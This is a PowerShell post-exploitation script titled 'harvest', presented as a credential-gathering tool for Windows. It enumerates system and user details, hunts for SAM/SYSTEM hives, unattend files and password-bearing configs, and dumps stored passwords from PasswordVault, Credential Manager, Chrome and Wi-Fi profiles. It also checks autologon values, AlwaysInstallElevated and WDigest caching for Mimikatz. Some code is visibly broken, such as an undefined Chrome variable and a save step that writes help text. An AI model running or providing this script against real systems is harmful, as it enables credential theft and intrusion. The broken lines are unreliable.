Write-Host @"
          
oooo                                                              .   v.2
`888                                                            .o8   
 888 .oo.    .oooo.   oooo d8b oooo    ooo  .ooooo.   .oooo.o .o888oo 
 888P"Y88b  `P  )88b  `888""8P  `88.  .8'  d88' `88b d88(  "8   888   
 888   888   .oP"888   888       `88..8'   888ooo888 `"Y88b.    888   
 888   888  d8(  888   888        `888'    888    .o o.  )88b   888 . 
o888o o888o `Y888""8o d888b        `8'     `Y8bod8P' 8""888P'   "888"                                                                                            
                                          
            A Credential Gathering Script by @wint3rmute.    

                                                           "^                             
                                                          `x.                             
                                                        .!x(                              
                                                     ...{vM1                              
                                                    `|nuvxx1:                             
             `.                                _+' :cnncvnjj^                             
             .f>.                  .'         `f\\xz**nnt(1)                              
              :x)^                 "c<.       ])(tnzz#c\1(|vt)l                           
              "t|{:!              .+nuvn,    I[)\fu*M*j/fxnxxj.                           
              ,{{[{1l             `jjrnuut:^:-[(jtnc#ujjxjfrn{                            
            '`l-?{{{[-. .         .)jununr/|({1/jxrzcjtt/tfrt'                            
            '/{}[)}{{}_+|'        -rrnznnxrt\\|trnnu1)(|trxj.                             
             [|||)\|(|\/\|        ~ufxzunuxjt///rnn{})\/tfr_:;l;:...'.                    
            ./)(1)/\trrxxvf.      ^zuvvzxuvxjt/fxcf|(1((\jrrrrxnvvc1`                     
             !}1)|/jfrnuuvx!      .*zzz#unnnxjfrn|)[1|((||tjxxunx>.                       
        .-;,^~|ttjrxrxuvuccc:     .M#**z*xxnxrjr|{1())|\frxxnj+,.                         
         |urjfjjjjrrnucvnv*#*;    'WMM#**cxnxrx(}{1)\\xxjjtjl                             
         'vurjjjjrjfxczvcz##WM].  "WMMMM#*uxxr(})(\rrrfffj+'                              
          .\unrrxxnnvcvcz*##MW#c"I#MMWWM#*vxu|)\jjjfjjfjl.                                
            }nnnxnuvcz*z**###MMMMMMMMMWWW#vnf/t/\fjrrn/'                                  
             }nnununuc**z**z##MMMMMMMMWWW#ut|1/frxnvvt.                                   
              >uuuvcvvc*#***##MMMMM*MWW&&*t(((|fnuucn.         ..`":'            .,:      
     '        .;cccz*z*#M**#####MMMM#W&&M/}}{(/xxrnz,....'`"I?rW&MMW{;>+]\r#-1fcx/^       
      ,|{[(|trnc******#MM##zzzz#MMMM#MMu)[|frxj/jrxuc*#MMWWWW&&WMW&&WWW&WWWWM#zx;.        
       .)jfrnvvvz*cz*****z***###MMWMM*u//\)}1(/txucz##MMMWW&&WWWWWW&MWWW#**cz*#^          
        .:/xnnvzzc*#zzzczc#z*M#MMMWW#xt(1))\jxnvzzMMMMMMWWWW#MW&W&WM**cccz**\:.           
           ^\ncz*##zzv*vfr*#z*MMMMWWx|)|\/rnuz*MMWWWMWWWWWWW###**z*ccccz*#*1.             
            `lncccz**zcvv*MM***#MWWctjfjjuc*#MWMWWWWWW#zcvuuvzzccz**z***v+:`.             
              .,[nczz*zczzz*zz*##Mvrnccc*#WWWWM##*vuxnnncccvuvuvzccz*|,'                  
                  :z*zcvvuxnz#*#Mvncc*#MMW*zcvnnnxunxnunrjrxuvvzcz*z*"                    
                  'I{xvccurnu*#&nfrccccvunuuuuvcuxrrnuunxxxrrrjnnuuvzz_'                  
                     .'^,;l<<>vMjn*#z***zzczccvuunvvuxxnnjrjffrvvn-:"`.                   
                             ,v`'(#*zzczcz***z*vvcvczccnv)l"`'.                           
                            .f.   "n*z****ccccc******#*##n'                               
                           .(`      :j**z****z*zz****#MMWWW;                              
                           -;         `{vuczcz*#*MM*####WWWWf.                            
                          ;?            .,_/f,`,-j#M#MWMWWWWWW+                           
                         `|                 '     .`,>(?":I?:>?]'                         
                         {'                                                               
                        !;                                                                
                       `\                                                                 
                       |`                                                                 
                      ;<                                                                  
                     .j.                                                                  
                     :I                                                                   
                     /.                                                                   
                    `?                                                                    
                    _"                                                                    
                    x.                                                                    
                   .r                                                                     
                   "~                                                                     
                   i,                                                                     
                   1`                                                                     
                   x'                                                                     
                   ri                                                                     
                   Ir'                                                                    
                    ..                                                                                                                                                                                                                                                                                                  

"@

# Function to search for files with passwords
function SearchFilesWithPasswords {
    param (
        [string]$searchPath
    )

    $passwordFiles = Get-ChildItem -Path $searchPath -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -ErrorAction SilentlyContinue
    $passwordFiles | Format-Table -AutoSize
}

# Basic System Enumeration
Write-Host "`nSystem Enumeration:"
Get-ComputerInfo | Format-Table -AutoSize

# Environment Variables
Write-Host "`nEnvironment Variables:"
Get-ChildItem Env: | Format-Table -AutoSize

# Network Information
Write-Host "`nNetwork Information:"
ipconfig /all

# Connected Drives
Write-Host "`nConnected Drives:"
Get-Volume | Format-Table -AutoSize

# Firewall Configuration
Write-Host "`nFirewall Configuration:"
Get-NetFirewallProfile | Format-Table -AutoSize

# User Information
Write-Host "`nUser Information:"
$env:USERNAME
$env:USERDOMAIN

# User Privileges
Write-Host "`nUser Privileges:"
whoami /priv

# Local Users
Write-Host "`nLocal Users:"
Get-WmiObject Win32_UserAccount | Format-Table -AutoSize

# Local User Privileges
Write-Host "`nLocal User Privileges:"
Get-LocalUser | Format-Table -AutoSize

# Local Groups
Write-Host "`nLocal Groups:"
Get-LocalGroup | Format-Table -AutoSize

# Local Group Privileges
Write-Host "`nLocal Group Privileges:"
Get-LocalGroupMember Administrators | Format-Table -AutoSize

# User Directories
Write-Host "`nUser Directories:"
Get-ChildItem -Path "C:\Users\" -Directory | Format-Table -AutoSize

# Search for SAM backup files
Write-Host "`nSearching for SAM backup files:"
Get-ChildItem -Path "C:\" -Include *SAM* -File -Recurse -ErrorAction SilentlyContinue | Format-Table -AutoSize

# Search for SYSTEM files
Write-Host "`nSearching for SYSTEM files:"
Get-ChildItem -Path "C:\" -Include *SYSTEM* -File -Recurse -ErrorAction SilentlyContinue | Format-Table -AutoSize

# List Running Processes
Write-Host "`nRunning Processes:"
Get-Process | Format-Table -AutoSize

# Identify files with potentially sensitive data such as account information, credentials, configuration files etc. based on their filename
Write-Host "`nSensitive Files:"
gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue

# Find credentials in Sysprep or Unattend files
# Look for remnants from automated installation and auto-configuration, which could potentially contain plaintext passwords or base64 encoded passwords
Write-Host "`nInstallation Remnants:"
gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue

# Find configuration files containing “password” string
# Locate files containing a certain pattern, e.g. here were are looking for a “password” pattern in various textual configuration files
Write-Host "`nPassword Strings:"
gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"

# Find database credentials in configuration files
# Find database connection strings (with plaintext credentials) stored in various configuration files such as web.config for ASP.NET configuration, in Visual Studio project files etc.
Write-Host "`nDatabase Credentials in Configuration Files:"
gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"

# Locate web server configuration files
# Find configuration files belonging to Microsoft IIS, XAMPP, Apache, PHP or MySQL installation:
Write-Host "`nWeb Server Configuration Files:"
gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue

# Get stored passwords from Windows PasswordVault
# extract secrets from the Windows PasswordVault, which is a Windows built-in mechanism for storing passwords and web credentials e.g. for Internet Explorer, Edge and other applications
Write-Host "`nStored Passwords from Windows PasswordVault:"
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }

# Get stored passwords from Windows Credential Manager
# Retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:
Write-Host "`nStored Passwords from Windows Credential Manager:"
Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }

# Dump passwords from Google Chrome browser
# Extracts stored credentials from the Google Chrome browser, if is installed and if there are any passwords stored:
Write-Host "`nPasswords from Google Chrome Browser:"
[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))

# Get stored Wi-Fi passwords from Wireless Profiles
# Extract all stored Wi-Fi passwords (WEP, WPA PSK, WPA2 PSK etc.) from the wireless profiles that are configured in the Windows system:
Write-Host "`nWi-fi Passwords from Wireless Profiles:"
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

# Search for SNMP community string in registry, extract SNMP community string stored in the registry, if there is any:
Write-Host "`nSNMP Community Strings:"
gci HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue

# Search registry for auto-logon credentials
# Systems can be configured to auto login upon boot, which is for example used on POS (point of sale) systems. 
# Typically, this is configured by storing the username and password in a specific Winlogon registry location, in clear text.
Write-Host "`nAuto-Logon Credentials:"
gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"

# Check if AlwaysInstallElevated is enabled
# If the following AlwaysInstallElevated registry keys are set to 1, it means that any low privileged user can install *.msi files with NT AUTHORITY\SYSTEM privileges
Write-Host "`nAlwaysInstallElevated Setting:"
gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated

# Check whether WDigest credential caching is enabled on the system or not. 
# This settings dictates whether we will be able to use Mimikatz to extract plaintext credentials from the LSASS process memory.
Write-Host "`nLSASS WDigest Caching enabled for mimikatz?:"
(gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential

# Search for files with passwords
Write-Host "`nSearching for files with passwords:"
$searchPath = Read-Host "Enter the search path (e.g., C:\)"
SearchFilesWithPasswords -searchPath $searchPath

# Save Output to a .txt File
$filePath = Read-Host "Enter the full path to save the output (e.g., C:\Windows\temp\credentials.txt)"
Get-Help | Out-File -FilePath $filePath

Write-Host "Script execution completed. Output saved to $filePath"
